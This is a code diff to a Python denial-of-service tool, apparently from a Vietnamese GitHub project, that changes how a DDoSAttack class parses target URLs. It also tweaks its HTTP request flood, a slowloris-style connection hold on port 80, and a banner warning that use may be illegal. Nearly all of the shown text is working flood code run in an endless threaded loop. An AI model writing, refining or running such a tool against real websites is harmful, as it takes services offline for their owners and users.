@@ -2,7 +2,7 @@ import os
 import threading
 import time
 import requests
-from urllib.parse import urlparse, urlunparse
+from urllib.parse import urlparse
 from colorama import Fore, Style
 from socket import *
 from random import randrange, choice
@@ -17,16 +17,13 @@ print("""
 
 class DDoSAttack:
     def __init__(self, target_url, threads):
-        # Đảm bảo URL có schema
-        parsed_url = urlparse(target_url)
-        if not parsed_url.scheme:
-            target_url = 'http://' + target_url
         self.target_url = target_url
         self.threads = threads
         self.attack_num = 0
-        self.target_domain = urlparse(target_url).netloc
-        self.target_path = urlparse(target_url).path or "/"
-        self.target_port = urlparse(target_url).port or 80  # Mặc định là port 80 nếu không có port
+        parsed_url = urlparse(target_url)
+        self.target_domain = parsed_url.netloc
+        self.target_path = parsed_url.path if parsed_url.path else "/"
+        self.schema = parsed_url.scheme or 'http'
 
     def start(self):
         print(f"Starting attack on {self.target_url}")
@@ -36,11 +33,8 @@ class DDoSAttack:
 
     def run(self):
         while True:
-            print("Running ddos_requester...")
             self.ddos_requester()
-            print("Running syn_flood...")
             self.syn_flood()
-            print("Running pyslow...")
             self.pyslow()
             time.sleep(0)  # Wait a bit before restarting
 
@@ -52,8 +46,10 @@ class DDoSAttack:
             'Accept-Encoding': 'gzip, deflate',
             'Connection': 'keep-alive'
         }
+        
         try:
-            response = requests.get(f"{self.target_url}{self.target_path}", headers=headers)
+            url = f"{self.schema}://{self.target_domain}{self.target_path}"
+            response = requests.get(url, headers=headers, timeout=10)
             self.attack_num += 1
             print(Fore.GREEN + f"Requester packet sent! Attack count: {self.attack_num} - Response code: {response.status_code}" + Style.RESET_ALL)
         except requests.RequestException as e:
@@ -85,7 +81,7 @@ class DDoSAttack:
     def pyslow(self):
         try:
             sock = socket(AF_INET, SOCK_STREAM)
-            sock.connect((self.target_domain, self.target_port))
+            sock.connect((self.target_domain, 80))
             sock.send(b'GET / HTTP/1.1\r\n')
             time.sleep(5)
             print(Fore.GREEN + "Pyslow connection established!" + Style.RESET_ALL)
@@ -137,7 +133,8 @@ Github: https://github.com/dhungx/ddos
 
 ĐỪNG TẤN CÔNG TRANG WEB CHÍNH PHỦ (NHÀ NƯỚC)
 
-HÃY CẨN THẬN TRƯỚC KHI SỬ DỤNG VÌ VIỆC BẠN SẮP LÀM CÓ THỂ LÀ PHẠM PHÁP
+HÃY CẨN THẬN TRƯỚC KHI SỬ DỤNG VÌ CÓ THỂ VIỆC BẠN SẮP LÀM LÀ MỘT ĐIỀU PHẠM PHÁP
+
 
 """ + Style.RESET_ALL)
     print(Style.BRIGHT + Fore.YELLOW + "[INFORMATION!]" + Fore.WHITE + " Press CTRL + C and ENTER to exit!!")
